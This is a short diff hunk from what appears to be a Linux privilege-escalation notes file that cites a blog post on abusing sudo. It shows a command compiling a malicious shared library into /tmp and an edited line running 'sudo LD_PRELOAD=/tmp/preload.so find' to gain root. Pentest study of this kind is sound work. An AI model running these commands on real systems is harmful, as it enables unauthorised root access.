@@ -210,7 +210,7 @@ https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/
 gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
 ```
 ```cmd
-sudo LD_PRELOAD=/tmp/preload.so program-name-here
+sudo LD_PRELOAD=/tmp/preload.so find
 ```
 
 ![]()
